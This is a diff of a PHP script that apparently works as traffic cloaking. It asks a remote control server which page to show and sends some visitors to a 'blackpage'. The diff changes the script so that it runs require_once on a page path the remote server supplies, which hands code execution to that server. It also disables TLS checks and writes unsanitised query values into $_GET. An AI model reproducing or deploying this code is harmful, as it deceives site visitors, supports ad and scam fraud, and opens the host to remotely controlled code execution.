@@ -12,7 +12,7 @@ $data = array(
 );
 $ch = curl_init();
 $optArray = array(
-    CURLOPT_URL => $mainserver.'connect_v2',
+    CURLOPT_URL => $mainserver.'api_v2',
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_SSL_VERIFYHOST => false,
     CURLOPT_SSL_VERIFYPEER => false,
@@ -24,37 +24,29 @@ curl_setopt_array($ch, $optArray);
 $result = curl_exec($ch);
 curl_close($ch);
 $responses = json_decode($result, true);
-if ($_SERVER['QUERY_STRING']!='') {
-  $responses['oldpage'] = $responses['page'];
-  $responses['page'] = $responses['page'].'?'.$_SERVER['QUERY_STRING'];
-}
-else {
-  $responses['oldpage'] = $responses['page'];
-}
 
-$arrContextOptions=array(
-    'ssl'=>array(
-        'verify_peer'=>false,
-        'verify_peer_name'=>false,
-    ),
-    'http' => array(
-        'header' => 'User-Agent: '.$responses['user_agent']
-    )
-);
+if ($_SERVER['QUERY_STRING']!='') {
+  $realpage = explode('?',$responses['page']);
+  $realpage = $realpage[0];
+  $responses['page'] = $realpage;
+
+  $querys = explode('&',$_SERVER['QUERY_STRING']);
+
+  foreach ($querys as $query) {
+    $query = explode('=',$query);
+    $_GET[$query[0]]=$query[1];
+  }
+}
 
 if ($responses['mode']=='load') {
-  $html = file_get_contents($responses['page'], false, stream_context_create($arrContextOptions));
-  $html = str_replace('<head>', '<head><base href="'.$responses['oldpage'].'" />', $html);
-  echo $html;
+  require_once($responses['page']);
 }
 else if ($responses['mode']=='redirect') {
   if ($responses['type']=='blackpage') {
     header('Location: '.$responses['page']);
   }
   else {
-    $html = file_get_contents($responses['page'], false, stream_context_create($arrContextOptions));
-    $html = str_replace('<head>', '<head><base href="'.$responses['oldpage'].'" />', $html);
-    echo $html;
+    require_once($responses['page']);
   }
 }
 ?>
